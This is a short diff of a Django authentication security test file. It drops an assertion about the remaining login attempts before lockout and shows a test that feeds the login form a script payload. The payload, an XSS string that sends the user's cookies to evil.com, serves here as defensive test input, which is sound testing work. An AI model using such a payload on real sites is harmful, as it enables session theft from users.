@@ -77,7 +77,6 @@ class AuthSecurityTests(TestCase):
         self.assertEqual(response.status_code, 200)
         self.assertTemplateUsed(response, "auth_app/login.html")
         self.assertContains(response, "Username atau password salah")
-        self.assertContains(response, "Sisa percobaan sebelum akun terkunci: 4")
 
     def test_login_form_rejects_script_payload_fields(self):
         payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
